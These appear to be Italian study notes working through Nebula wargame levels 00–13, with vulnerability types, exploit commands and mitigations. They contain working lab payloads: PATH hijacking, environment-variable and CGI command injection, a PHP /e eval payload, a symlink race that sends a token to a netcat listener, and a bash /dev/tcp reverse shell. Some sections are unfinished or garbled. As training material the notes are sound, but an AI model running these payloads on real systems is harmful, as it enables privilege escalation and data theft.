## Level00 FATTO

### Consegna

> This level requires you to *find* a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
> 
> 
> Alternatively, look at the find man page.
> 
> To access this level, log in as level00 with the password of level00.
> 

### Tipo Vulnerabilitànan

SUID misconfiguration

### Descrizione Exploit

```bash
find / -user flag00 -perm -4000  2> /dev/null
```

Output:
`-rwsr-x--- 1 flag00 level00` 

k → `-` = file normale, `d` = directory, `l` = link simbolico
x y z (r w s)-> indicano i permessi dello user owner flag00

- r = owner permessi di read
- w = owner permessi di write
- s = execute con permessi dell’owner

x’ y’ z’ (r - x) → indicano i permessi del gruppo level00

- r = gruppo può leggere
- - = gruppo non può scrivere
- x = gruppo può eseguire

z’’ y’’ z’’ (- - -)→ indicano i permessi degli altri 

- - = non possono leggere
- -  = non possono scrivere
- -  = non possono eseguire 

flag00  = owner del file 
level00 = group del file

### Mitigazioni

Rimuovere bit SUID da eseguibili non necessari, usare controllo accessi

---

## Level01 FATTO

### Consegna

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
> 
> 
> To do this level, log in as the **level01** account with the password **level01**. Files for this level can be found in /home/flag01.
> 

### Tipo Vulnerabilità

PATH injection

### Descrizione Exploit

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  // ottiene l'effettivo GID/UID del processo (cioè i permessi attivi, ereditati dal file SUID/SGID)
  gid = getegid();
  uid = geteuid();
  
  // imposta i GID/UID reali, effettivi e salvati a quelli effettivi correnti
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

Il programma esegue un comando esterno (echo) tramite system(), senza specificare un percorso assoluto, ma tramite variabile PATH. Modificando la variabile path è possibile andare ad modificare il file echo che viene eseguito.  

TIPO: Command execution via untrusted environment (`PATH`).

```bash
nano /tmp/echo # -> creo il file echo

/bin/sh # -> ci scrivo dentro /bin/sh 

chmod +x /tmp/echo

export PATH=/tmp:$PATH # -> aggiungo a var PATH il percorso per il binario echo che fa /bin/sh

./flag01 # -> eseguo il file 
```

### Mitigazioni

Usare eseguibili con path assoluto, evitare system(), sanitizzare PATH

---

## Level02 FATTO

### Consegna

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
> 
> 
> To do this level, log in as the **level02** account with the password **level02**. Files for this level can be found in /home/flag02.
> 

### Tipo Vulnerabilità

Command injection

### Descrizione Exploit

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

TIPO: Command Injection via variabile d'ambiente (`getenv("USER")`)

```bash
export USER="; /bin/bash #"
```

### Mitigazioni

Validare/escapare USER o evitare affidarsi a `system()`, usare execve

---

## Level03 FATTO

### Consegna

> Check the home directory of **flag03** and take note of the files there.
> 
> 
> There is a crontab that is called every couple of minutes.
> 
> To do this level, log in as the **level03** account with the password level03. Files for this level can be found in /home/flag03.
> 

### Tipo Vulnerabilità

Esecuzione file non sicura via crontab

### Descrizione Exploit

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Il sistema esegue automaticamente **tutti i file nella directory `/home/flag03/writable.d/`** con i permessi di `flag03`. Questo avviene perché su crontab di flag03 è programmata l’escuzione automatica ogni 2 minuti dello script `writable.sh`, il quale esegue tutti i file in `writeble.d`.

```bash
getflag 1> /tmp/flag.txt
chmod 700 flag.txt

oppure

nc -vln 9999 
getflag | nc 127.0.0.1 9999
```

### Mitigazioni

Limitare permessi su cartella, rimuovere directory scrivibili, usare whitelist

---

## Level04

### Consegna

> This level requires you to read the **token** file, but the code restricts the files that can be read. Find a way to bypass it :)
To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.
> 

### Tipo Vulnerabilità

Bypass path traversal

### Descrizione Exploit

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

Si puo bypassare il check creando un symlink al token, però non bisogna metterlo in /home/flag04 ma in /tmp/ 

```c
ln -s /home/flag04/token /tmp/lmao 
./flag04 /tmp/lmao
```

### Mitigazioni

- **Validazione rigorosa del path**
    - Controllare **il percorso reale**, non solo il nome, usando `realpath()`.
        
        Esempio:
        
        ```c
        c
        CopyEdit
        char resolved[PATH_MAX];
        realpath(argv[1], resolved);
        if (strstr(resolved, "/home/flag04/token") != NULL) {
            // blocca l'accesso
        }
        
        ```
        
- **Evitare symlink**
    - Aprire i file con `open()` usando il flag `O_NOFOLLOW`, che **rifiuta symlink**:
        
        ```c
        c
        CopyEdit
        open(argv[1], O_RDONLY | O_NOFOLLOW);
        ```
        
- **Uso di whitelist**
- Permettere la lettura **solo da directory specifiche**, non basarsi su blacklist testuali.
- **Regole di accesso (permissions)**
    - Rimuovere i permessi su directory sensibili: ad esempio `/home/flag04/` **non dovrebbe essere scrivibile da `level04`**, impedendo che crei file o symlink lì.
- **Chroot** o scambio di utente
    - Eseguire il binario in un ambiente ristretto (sandbox, chroot), in modo che non possa creare symlink verso directory sensibili.

---

## Level05 FATTO

### Consegna

> Check the **flag05** home directory. You are looking for weak directory permissions.
To do this level, log in as the **level05** account with the password **level05**. Files for this level can be found in /home/flag05.
> 

### Tipo Vulnerabilità

Permessi directory

### Descrizione Exploit

```c
ls -la /home/flag05

drwxr-xr-x 1 flag05 flag05  .......  .backup 
```

come si può notare flag05 è leggibile ed eseguibile da other. 
Dentro questa directory trivuani backup.tgz
Exploit:

```c
cp /home/flag05/.backup/file.tgz     /tmp/level05/
tar -xvzf file.tgz
ssh -i ./.ssh/id_rsa flag05@127.0.0.1
```

### Mitigazioni

Rimuovere permessi `+w` da directory critiche, restrizioni chroot

---

## Level06 FATTO

### Consegna

> The **flag06** account credentials came from a legacy UNIX system.
> 
> 
> To do this level, log in as the **level06** account with the password **level06**. Files for this level can be found in /home/flag06.
> 

### Tipo Vulnerabilità

Hash DES in `/etc/passwd`

### Descrizione Exploit

Hash DES facilmente craccabile offline;
Estrarre hash `flag06` e craccarlo con John, poi `su` → `getflag`

### Mitigazioni

Usare hashing moderno (SHA‑512), spostare hash in `/etc/shadow` e usare salt complessi

---

## Level07

### Consegna

> The **flag07** user was writing their very first PERL program that allowed them to ping hosts to see if they were reachable from the web server.
> 
> 
> To do this level, log in as the **level07** account with the password **level07**. Files for this level can be found in /home/flag07.
> 

### Tipo Vulnerabilità

Improper Neutralization of Special Elements used in an OS Command Injection

### Descrizione Exploit

```bash
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

```bash
wget 'http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag'
# comando eseguito in un path in cui il server può scrivere

wget -qO- 'http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag'
# comando eseguito con risposta su stdout
```

In un URL, caratteri riservati come `;`, `?`, `&`, ecc. **hanno un significato speciale, s**e vuoi usarli **letteralmente nel valore del parametro**, è necessario **percent-encodarli** (URL-encoding), ossia sostituirli con `%HH`, dove `HH` è il valore esadecimale del carattere.

### Mitigazioni

Sanitizzare input (es. `escapeshellarg`), limitare parametri, evitare shell interpolation

---

## Level 08  FATTO

### Consegna

> World readable files strike again. Check what that user was up to, and use it to log into **flag08** account.
> 
> 
> To do this level, log in as the **level08** account with the password **level08**. Files for this level can be found in /home/flag08.
> 

### Tipo Vulnerabilità

**Informational disclosure**: un file sensibile (`capture.pcap`) è **leggibile da chiunque** (`world-readable`), permettendo accesso a dati confidenziali.

### Descrizione Exploit

Il file pcap contiene un **login Telnet/SSH**, incluso username e password. Grazie alle letture di tasti “delete” (byte `0x7f`), la password può essere **ricostruita** cancellando i caratteri corrispondenti.

- Leggi `capture.pcap` con uno strumento come `tcpflow` o Wireshark:
    
    ```bash
    tcpflow -ec -r /home/flag08/capture.pcap | less -r
    
    . . . > canc canc canc
    backd00Rmate
    ```
    
- Segui il TCP stream e raccogli la password “pesante” con backspace:
    
    Vedi byte `0x7f` → significa cancellazione del carattere precedente.
    
- Ricostruisci la password: **`backd00Rmate`** [secinject.wordpress.com+4github.com+4the-dark-lord.medium.com+4](https://github.com/pwntester/pwntester-blog/blob/master/content/post/nebula-level08-write-up.md?utm_source=chatgpt.com)[secinject.wordpress.com](https://secinject.wordpress.com/2015/09/04/nebula-level08/?utm_source=chatgpt.com).
- Accedi con:
    
    ```bash
    su - flag08
    ```
    
    Inserisci `backd00Rmate`, poi:
    
    ```bash
    getflag
    ```
    

### Mitigazioni

- **Rimuovere permessi world-readable**:
    
    ```bash
    bash
    chmod o-r /home/flag08/capture.pcap
    ```
    
- **Usare connessioni cifrate**, ed evitare l'invio di credenziali in chiaro su rete.
- In scenari reali, **non salvare capture di login in formati accessibili**, o rimuovere file sensibili subito dopo l’uso.

---

## Level 09

### Consegna

> There’s a C setuid wrapper for some vulnerable PHP code.
> 
> 
> To do this level, log in as the **level09** account with the password **level09**. Files for this level can be found in /home/flag09.
> 

```c

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

### Tipo Vulnerabilità

command injection perchè /e nella funzione pre_replace è vulnerabile perche esegue eval(comando)

### Descrizione Exploit

[email {${system(getflag)}}]

### Mitigazioni

---

Non usare /e in preg_replace(), e utilizzare versione aggiornate di PHP.

## Level 10 FATTO

### Consegna

> The SETUID binary at **/home/flag10/flag10** binary will upload any file given, as long as it meets the requirements of the *access()* system call.
> 
> 
> To do this level, log in as the **level10** account with the password **level10**. Files for this level can be found in /home/flag10.
> 

### Tipo Vulnerabilità

### Descrizione Exploit

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

Questa è una classica vulnerabilità di tipo **TOCTTOU (Time Of Check To Time Of Use)**.

La funzione `access()` controlla l'UID **reale** del processo per determinare se l'utente ha accesso a un file, mentre la funzione `open()` utilizza invece l'UID **effettivo**.

L’obiettivo qui è usare il binario `flag10` per leggere il file `token`.

```bash
level10@nebula:~$ ls -lah /home/flag10
total 14K
drwxr-x--- 2 flag10 level10   93 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
-rw-r--r-- 1 flag10 flag10   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag10 flag10  3.3K 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag10 level10 7.6K 2011-11-20 21:22 flag10
-rw-r--r-- 1 flag10 flag10   675 2011-05-18 02:54 .profile
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
```

```bash
level10@nebula:~```bash
level10@nebula:~$ /home/flag10/flag10 /home/flag10/token 192.168.144.1
You don't have access to /home/flag10/token
```$ /home/flag10/flag10 /home/flag10/token 192.168.144.1
You don't have access to /home/flag10/tokenwh
```

Possiamo forzare una race condition nel programma facendogli leggere un **symlink** che inizialmente punta a un file posseduto dall’UID reale (`level10`) e modificando quel symlink per puntare al file `token` **dopo** la chiamata `access()` ma **prima** della chiamata `open()`.

Iniziamo configurando un listener sulla porta 18211 per ricevere il contenuto del file `token`.

Usiamo il flag `-k` per mantenere il listener attivo tra più connessioni.

```bash
nc -vln 18211
```

Sul sistema Nebula, apriamo **due terminali con TMUX**.

**Nel primo terminale:**

Eseguiamo un ciclo che cambia costantemente il symlink `/tmp/token` tra `/tmp/faketoken` e `/home/flag10/token`.

```bash
level10@nebula:~$ touch /tmp/faketoken
level10@nebula:~$ while :; do ln -fs /tmp/faketoken /tmp/token; ln -fs /home/flag10/token /tmp/token; done
```

questa cosa andrà  a creare 2 symlink 

1. che punta a /tmp/faketoken che si chiama token
2. punta a /home/flag10/token e si chiamerà sempre token

**Nel secondo terminale:**

Eseguiamo costantemente il binario `flag10` contro `/tmp/token`.

```bash
while :; do /home/flag10/flag10 /tmp/token 192.168.144.1 ; done
```

Alla fine, vedremo il file `token` inviato al nostro listener:

```bash
... snip ...
Ncat: Connessione da 192.168.144.191:57857.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
... snip ...
```

Come nei livelli precedenti, la stringa contenuta nel file `token` è la password dell’utente `flag10`.

```bash
level10@nebula:~$ su - flag10
Password:
flag10@nebula:~$ whoami
flag10
flag10@nebula:~$ id
uid=989(flag10) gid=989(flag10) groups=9nc89(flag10)
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```

### Mitigazioni

- Evitare access() e usare open()
- Bloccare l’uso dei link tramite O_NOFOLLOW
- Rimuovere SUID

---

## Level 11

### Consegna

> The **/home/flag11/flag11** binary processes standard input and executes a shell command.
> 
> 
> There are two ways of completing this level, you may wish to do both :-)
> 
> To do this level, log in as the **level11** account with the password **level11**. Files for this level can be found in /home/flag11.
> 

### Tipo Vulnerabilità

### Descrizione Exploit

### Mitigazioni

---

## Level 12

### Consegna

There is a backdoor process listening on port 50001.

To do this level, log in as the **level12** account with the password **level12**. Files for this level can be found in /home/flag12.

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

### Vulnerabilità

command injection in 

```lua
	prog = io.popen("echo "..password.." | sha1sum", "r")
```

### Descrizione Exploit

apro due shell 

1)

```lua
nc -lvn 9000 
```

2)

```lua
nc 127.0.0.1 50001 

Password: echo ciao; getflag | nc 127.0.0.1 9000 ; echo ciao

oppure 

;bash -i >&/dev/tcp/127.0.0.1/9000 0>&1
```

e mi arriverà la frase get flag nella shell del server nc 

## Level 13 FATTO

in qusto esercizio bisogna bypassare il check quello che possiamo fare è 

```lua
gdb -q flag13

r

b *main+48 

info registers
eax -> 1014

set $eax = 1000

c

```
